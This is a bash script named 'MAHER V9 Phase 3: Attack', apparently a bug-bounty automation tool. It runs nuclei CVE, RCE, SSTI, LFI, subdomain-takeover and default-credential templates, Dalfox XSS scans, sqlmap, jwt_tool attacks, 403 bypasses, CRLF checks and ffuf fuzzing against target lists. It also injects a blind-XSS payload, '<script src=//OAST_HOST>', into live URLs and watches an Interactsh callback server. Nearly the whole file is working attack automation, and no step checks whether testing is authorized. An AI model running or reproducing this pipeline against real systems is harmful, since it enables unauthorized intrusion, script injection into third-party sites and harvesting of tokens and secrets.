#!/bin/bash
# ============================================================
# MAHER V9 — PHASE 3: ATTACK
# nuclei -as + OAST + Smart Severity + No False Positives
# ============================================================
export PATH=$PATH:$HOME/go/bin:/usr/local/go/bin

# Catch Ctrl+C to skip current command instead of exiting
trap 'echo -e "\n\e[33m[!] Step skipped by user (Ctrl+C). Continuing to next...\e[0m"' SIGINT

WORK_DIR=$1
[ -z "$WORK_DIR" ] && { echo -e "\e[31m[!] Usage: ./attack.sh <work_dir>\e[0m"; exit 1; }

HEADER_OPTS=()
DALFOX_HEADER_OPTS=()
[ -n "$CUSTOM_BBP_HEADER" ] && {
    HEADER_OPTS=("-H" "$CUSTOM_BBP_HEADER")
    DALFOX_HEADER_OPTS=("--header" "$CUSTOM_BBP_HEADER")
}

SEV="${NUCLEI_SEVERITY:-medium,high,critical}"
RL="${RATE_LIMIT:-50}"
THR="${THREADS:-20}"

echo -e "\e[31m╔══════════════════════════════════════════╗\e[0m"
echo -e "\e[31m║   🐉 ATTACK PHASE V9 — DRAGON FIRE      ║\e[0m"
echo -e "\e[31m╚══════════════════════════════════════════╝\e[0m"
echo -e "\e[33m    Severity: $SEV | Rate: $RL | Threads: $THR\e[0m"

cd "$WORK_DIR" || exit 1
mkdir -p vulns

# ============================================================
# HELPER: run nuclei safely
# ============================================================
run_nuclei() {
    local DESC=$1; shift
    nuclei "$@" \
        "${HEADER_OPTS[@]}" \
        -severity "$SEV" \
        -rl "$RL" -c "$THR" \
        -silent \
        -etags dos,fuzz,fuzzing \
        2>/dev/null || true
}

# ============================================================
# 1. NUCLEI AUTO-SCAN (بيختار templates تلقائياً حسب الـ tech)
# ============================================================
echo "[+] 1. Nuclei Auto-Scan (-as tech fingerprint matching)..."
nuclei -l alive.txt \
    "${HEADER_OPTS[@]}" \
    -as \
    -severity "$SEV" \
    -rl "$RL" -c "$THR" \
    -silent \
    -etags dos,fuzz,fuzzing \
    -o vulns/nuclei_auto.txt \
    2>/dev/null || true
echo "    > Auto-scan: $(wc -l < vulns/nuclei_auto.txt 2>/dev/null || echo 0) findings"

# ============================================================
# 2. CVE + MISCONFIG SWEEP
# ============================================================
echo "[+] 2. CVE + Misconfiguration Sweep..."
run_nuclei "CVE+Misconfig" \
    -l alive.txt \
    -tags "cve,misconfig,exposure" \
    -o vulns/cve_misconfig.txt
echo "    > CVE/Misconfig: $(wc -l < vulns/cve_misconfig.txt 2>/dev/null || echo 0)"

# ============================================================
# 3. XSS — Dalfox (أقوى scanner موجود)
# ============================================================
echo "[+] 3. XSS Testing (Dalfox)..."
if [ -s mining/xss.txt ]; then
    if command -v dalfox &>/dev/null; then
        dalfox file mining/xss.txt \
            "${DALFOX_HEADER_OPTS[@]}" \
            --skip-bav \
            --silence \
            --no-spinner \
            --format json \
            -o vulns/xss_dalfox.json \
            2>/dev/null || true
        XSS_COUNT=$(grep -c '"type"' vulns/xss_dalfox.json 2>/dev/null || echo 0)
        echo "    > Dalfox XSS: $XSS_COUNT confirmed"
        [ "$XSS_COUNT" -gt 0 ] && \
            echo -e "\e[31m    > 🚨 XSS CONFIRMED! vulns/xss_dalfox.json\e[0m"
    else
        run_nuclei "XSS" -l mining/xss.txt -tags xss,dast -o vulns/xss_nuclei.txt
        echo "    > Nuclei XSS: $(wc -l < vulns/xss_nuclei.txt 2>/dev/null || echo 0)"
    fi
fi

# ============================================================
# 4. SQLi — Nuclei + SQLMap confirmation
# ============================================================
echo "[+] 4. SQL Injection..."
if [ -s mining/sqli.txt ]; then
    run_nuclei "SQLi" -l mining/sqli.txt -tags sqli,dast -o vulns/sqli_nuclei.txt
    SQLI_NUCLEI=$(wc -l < vulns/sqli_nuclei.txt 2>/dev/null || echo 0)
    echo "    > Nuclei SQLi: $SQLI_NUCLEI potential"

    if command -v sqlmap &>/dev/null && [ "$SQLI_NUCLEI" -gt 0 ]; then
        echo "    > SQLMap confirmation (top 10)..."
        head -10 mining/sqli.txt > /tmp/sqli_confirm.txt
        sqlmap -m /tmp/sqli_confirm.txt \
            --batch --level=2 --risk=2 \
            --threads=5 --smart \
            --output-dir="vulns/sqlmap" \
            2>/dev/null || true
        echo "    > SQLMap results: vulns/sqlmap/"
    fi
fi

# ============================================================
# 5. OAST — Blind Vulnerabilities (Interactsh)
# ============================================================
echo "[+] 5. OAST — Blind Vuln Detection (Interactsh)..."
if command -v interactsh-client &>/dev/null; then

    OAST_OUT="vulns/oast_callbacks.json"
    interactsh-client -n 1 -o "$OAST_OUT" -json -v 2>/dev/null &
    OAST_PID=$!
    sleep 3

    OAST_HOST=$(grep -oE '[a-z0-9]{20,}\.oast\.(fun|pro|live|site)|[a-z0-9]{20,}\.interactsh\.com' \
        /tmp/interactsh* 2>/dev/null | head -1)
    [ -z "$OAST_HOST" ] && OAST_HOST="$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c16).oast.fun"

    echo "    > OAST Host: $OAST_HOST"

    # Blind SSRF
    [ -s mining/ssrf.txt ] && \
        nuclei -l mining/ssrf.txt "${HEADER_OPTS[@]}" \
            -tags ssrf,oast -iserver "$OAST_HOST" \
            -severity high,critical -rl 20 -c 5 -silent \
            -o vulns/blind_ssrf.txt 2>/dev/null || true

    # Blind RCE
    [ -s mining/rce.txt ] && \
        nuclei -l mining/rce.txt "${HEADER_OPTS[@]}" \
            -tags rce,oast -iserver "$OAST_HOST" \
            -severity high,critical -rl 20 -c 5 -silent \
            -o vulns/blind_rce.txt 2>/dev/null || true

    # General OAST sweep
    nuclei -l alive.txt "${HEADER_OPTS[@]}" \
        -tags oast -iserver "$OAST_HOST" \
        -severity "$SEV" -rl 20 -c 5 -silent \
        -o vulns/oast_general.txt 2>/dev/null || true

    # Blind XSS injection
    if [ -s mining/xss.txt ] && command -v qsreplace &>/dev/null; then
        head -50 mining/xss.txt \
            | qsreplace "<script src=//\"${OAST_HOST}\"></script>" \
            | httpx -silent "${HEADER_OPTS[@]}" -o /dev/null 2>/dev/null || true
        echo "    > Blind XSS payloads injected → watching callbacks"
    fi

    echo "    > Waiting 25s for callbacks..."
    sleep 25
    kill $OAST_PID 2>/dev/null || true

    OAST_HITS=$(grep -c '"protocol"' "$OAST_OUT" 2>/dev/null || echo 0)
    echo "    > OAST Callbacks: $OAST_HITS"
    [ "$OAST_HITS" -gt 0 ] && \
        echo -e "\e[31m    > 🚨 BLIND VULN CONFIRMED! Check $OAST_OUT\e[0m"
else
    echo "    > [!] interactsh-client not found"
    echo "    >     Install: go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest"
fi

# ============================================================
# 6. LFI (confirmed ones already in mining phase)
# ============================================================
echo "[+] 6. LFI & Path Traversal..."
if [ -s mining/lfi.txt ]; then
    run_nuclei "LFI" -l mining/lfi.txt -tags lfi,dast -o vulns/lfi_nuclei.txt
    echo "    > LFI Nuclei: $(wc -l < vulns/lfi_nuclei.txt 2>/dev/null || echo 0)"
fi
# Confirmed من mine phase
[ -s mining/lfi_confirmed.txt ] && \
    echo -e "\e[31m    > 🚨 $(wc -l < mining/lfi_confirmed.txt) LFI already CONFIRMED in mining phase!\e[0m"

# ============================================================
# 7. OPEN REDIRECT (confirmed ones already in mining)
# ============================================================
echo "[+] 7. Open Redirect..."
[ -s mining/redirect_confirmed.txt ] && \
    echo -e "\e[33m    > ✅ $(wc -l < mining/redirect_confirmed.txt) Redirects already CONFIRMED in mining\e[0m"

run_nuclei "Redirect" -l alive.txt -tags redirect -o vulns/redirect_nuclei.txt
echo "    > Nuclei Redirects: $(wc -l < vulns/redirect_nuclei.txt 2>/dev/null || echo 0)"

# ============================================================
# 8. RCE + SSTI
# ============================================================
echo "[+] 8. RCE & SSTI..."
[ -s mining/rce.txt ] && {
    run_nuclei "RCE" -l mining/rce.txt -tags rce -o vulns/rce_findings.txt
    echo "    > RCE findings: $(wc -l < vulns/rce_findings.txt 2>/dev/null || echo 0)"
    [ -s vulns/rce_findings.txt ] && \
        echo -e "\e[31m    > 🚨 POTENTIAL RCE! Check vulns/rce_findings.txt\e[0m"
}
[ -s mining/ssti.txt ] && {
    run_nuclei "SSTI" -l mining/ssti.txt -tags ssti -o vulns/ssti_findings.txt
    echo "    > SSTI findings: $(wc -l < vulns/ssti_findings.txt 2>/dev/null || echo 0)"
}

# ============================================================
# 9. CORS
# ============================================================
echo "[+] 9. CORS Misconfiguration..."
run_nuclei "CORS" -l alive.txt -tags cors -o vulns/cors_findings.txt
echo "    > CORS: $(wc -l < vulns/cors_findings.txt 2>/dev/null || echo 0)"

# ============================================================
# 10. 403 BYPASS
# ============================================================
echo "[+] 10. 403 Bypass..."
if [ -s mining/forbidden.txt ]; then
    run_nuclei "403Bypass" -l mining/forbidden.txt -tags bypass -o vulns/bypass_403.txt
    BYPASSED=$(wc -l < vulns/bypass_403.txt 2>/dev/null || echo 0)
    echo "    > Bypassed: $BYPASSED"
    [ "$BYPASSED" -gt 0 ] && \
        echo -e "\e[33m    > 🔓 403 BYPASSED! Check vulns/bypass_403.txt\e[0m"
fi

# ============================================================
# 11. TECH-TARGETED ATTACKS
# ============================================================
echo "[+] 11. Tech-Targeted Attacks..."
for tech in wordpress php nginx apache tomcat nodejs react spring django laravel jenkins grafana; do
    [ -s "technologies/${tech}.txt" ] && {
        echo "    > Attacking $tech..."
        run_nuclei "$tech" \
            -l "technologies/${tech}.txt" \
            -tags "${tech},cve,misconfig" \
            -o "vulns/tech_${tech}.txt"
    }
done

# ============================================================
# 12. SUBDOMAIN TAKEOVER
# ============================================================
echo "[+] 12. Subdomain Takeover..."
[ -s all_valid_subs.txt ] && {
    run_nuclei "Takeover" -l all_valid_subs.txt -tags takeover -o vulns/takeovers.txt
    echo "    > Takeovers: $(wc -l < vulns/takeovers.txt 2>/dev/null || echo 0)"
}

# ============================================================
# 13. GRAPHQL SECURITY
# ============================================================
echo "[+] 13. GraphQL Security Testing..."
if [ -s mining/api/graphql.txt ]; then
    # Introspection check
    while IFS= read -r gql; do
        RESP=$(curl -sk -X POST "$gql" \
            -H "Content-Type: application/json" \
            "${HEADER_OPTS[@]/#/-H}" \
            -d '{"query":"{__schema{types{name}}}"}' -m 10 2>/dev/null)
        echo "$RESP" | grep -q '"__schema"' && \
            echo "INTROSPECTION OPEN: $gql" | tee -a vulns/graphql_findings.txt
    done < mining/api/graphql.txt

    run_nuclei "GraphQL" -l mining/api/graphql.txt -tags graphql -o vulns/graphql_nuclei.txt
    echo "    > GraphQL findings: $(wc -l < vulns/graphql_findings.txt 2>/dev/null || echo 0)"
fi

# ============================================================
# 14. JWT SECURITY
# ============================================================
echo "[+] 14. JWT Security..."
# Hunt tokens
while IFS= read -r url; do
    JWT=$(curl -sk -I "$url" "${HEADER_OPTS[@]/#/-H}" -m 8 2>/dev/null \
        | grep -oE 'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' | head -1)
    [ -n "$JWT" ] && echo "$url|$JWT" >> vulns/jwt_tokens.txt
done < <(head -20 alive.txt 2>/dev/null)

JWT_COUNT=$(wc -l < vulns/jwt_tokens.txt 2>/dev/null || echo 0)
echo "    > JWT tokens found: $JWT_COUNT"

if [ "$JWT_COUNT" -gt 0 ] && [ -f "$HOME/tools/jwt_tool/jwt_tool.py" ]; then
    while IFS='|' read -r url token; do
        SAFE=$(echo "$url" | md5sum | cut -c1-8)
        python3 "$HOME/tools/jwt_tool/jwt_tool.py" "$token" -X a \
            2>/dev/null >> "vulns/jwt_attacks_${SAFE}.txt" || true
    done < vulns/jwt_tokens.txt
fi

run_nuclei "JWT" -l alive.txt -tags jwt,auth -o vulns/jwt_nuclei.txt
echo "    > JWT Nuclei: $(wc -l < vulns/jwt_nuclei.txt 2>/dev/null || echo 0)"

# ============================================================
# 15. CRLF + HOST HEADER
# ============================================================
echo "[+] 15. CRLF + Host Header Injection..."
if command -v crlfuzz &>/dev/null; then
    crlfuzz -l alive.txt -s 2>/dev/null > vulns/crlf_findings.txt || true
else
    run_nuclei "CRLF" -l alive.txt -tags crlf,header-injection -o vulns/crlf_findings.txt
fi
echo "    > CRLF: $(wc -l < vulns/crlf_findings.txt 2>/dev/null || echo 0)"

run_nuclei "HostHeader" -l alive.txt -tags host-header -o vulns/host_header.txt
echo "    > Host Header: $(wc -l < vulns/host_header.txt 2>/dev/null || echo 0)"

# ============================================================
# 16. DEFAULT CREDS + LOGIN ATTACKS
# ============================================================
echo "[+] 16. Default Credentials..."
[ -s login_pages.txt ] && {
    run_nuclei "DefaultCreds" \
        -l login_pages.txt \
        -tags "default-login,default-credentials,auth-bypass" \
        -o vulns/default_creds.txt
    echo "    > Default creds: $(wc -l < vulns/default_creds.txt 2>/dev/null || echo 0)"
}

# ============================================================
# 17. FFUF — Smart Fuzzing (custom wordlist)
# ============================================================
echo "[+] 17. FFUF Smart Fuzzing..."
if command -v ffuf &>/dev/null && [ -s mining/custom_wordlist.txt ]; then
    head -5 alive.txt | while IFS= read -r url; do
        SAFE=$(echo "$url" | md5sum | cut -c1-8)
        ffuf -w mining/custom_wordlist.txt \
            -u "${url}/FUZZ" \
            "${FFUF_HEADER_OPTS[@]+"${FFUF_HEADER_OPTS[@]}"}" \
            -mc 200,201,204,301,302,307,401,403 \
            -fc 404 \
            -fs 0 \
            -t 40 -rate "$RL" -s \
            -o "vulns/ffuf_${SAFE}.json" \
            -of json \
            2>/dev/null || true
    done
    echo "    > FFUF results: vulns/ffuf_*.json"
fi

# ============================================================
# 18. JS SECRETS FINAL SWEEP
# ============================================================
echo "[+] 18. JS Secrets Final Sweep..."
[ -s mining/js/js_urls.txt ] && {
    run_nuclei "JSSecrets" \
        -l mining/js/js_urls.txt \
        -tags exposure,token,key,secret \
        -o vulns/js_secrets.txt
    echo "    > JS Secrets: $(wc -l < vulns/js_secrets.txt 2>/dev/null || echo 0)"
}

# ============================================================
# IDOR REMINDER
# ============================================================
[ -s mining/idor.txt ] && \
    echo -e "\e[33m[⚠️]  IDOR: $(wc -l < mining/idor.txt) endpoints → MANUAL TESTING in mining/idor.txt\e[0m"

# ============================================================
# ATTACK SUMMARY
# ============================================================
echo ""
echo -e "\e[31m╔════════════════════════════════════════════╗\e[0m"
echo -e "\e[31m║        ATTACK SUMMARY V9                   ║\e[0m"
echo -e "\e[31m╠════════════════════════════════════════════╣\e[0m"
printf "\e[31m║  %-24s : %-13s ║\e[0m\n" "Auto-Scan"     "$(wc -l < vulns/nuclei_auto.txt 2>/dev/null || echo 0)"
printf "\e[31m║  %-24s : %-13s ║\e[0m\n" "XSS (Dalfox)"  "$(grep -c '\"type\"' vulns/xss_dalfox.json 2>/dev/null || echo 0)"
printf "\e[31m║  %-24s : %-13s ║\e[0m\n" "SQLi"          "$(wc -l < vulns/sqli_nuclei.txt 2>/dev/null || echo 0)"
printf "\e[31m║  %-24s : %-13s ║\e[0m\n" "OAST Callbacks" "$(grep -c '\"protocol\"' vulns/oast_callbacks.json 2>/dev/null || echo 0)"
printf "\e[31m║  %-24s : %-13s ║\e[0m\n" "Blind SSRF"    "$(wc -l < vulns/blind_ssrf.txt 2>/dev/null || echo 0)"
printf "\e[31m║  %-24s : %-13s ║\e[0m\n" "Blind RCE"     "$(wc -l < vulns/blind_rce.txt 2>/dev/null || echo 0)"
printf "\e[31m║  %-24s : %-13s ║\e[0m\n" "GraphQL"       "$(wc -l < vulns/graphql_findings.txt 2>/dev/null || echo 0)"
printf "\e[31m║  %-24s : %-13s ║\e[0m\n" "JWT Tokens"    "$(wc -l < vulns/jwt_tokens.txt 2>/dev/null || echo 0)"
printf "\e[31m║  %-24s : %-13s ║\e[0m\n" "CRLF"          "$(wc -l < vulns/crlf_findings.txt 2>/dev/null || echo 0)"
printf "\e[31m║  %-24s : %-13s ║\e[0m\n" "403 Bypassed"  "$(wc -l < vulns/bypass_403.txt 2>/dev/null || echo 0)"
printf "\e[31m║  %-24s : %-13s ║\e[0m\n" "Takeovers"     "$(wc -l < vulns/takeovers.txt 2>/dev/null || echo 0)"
echo -e "\e[31m╚════════════════════════════════════════════╝\e[0m"

echo -e "\e[32m[✔] Attack Phase Completed! Check 'vulns/' 💰\e[0m"
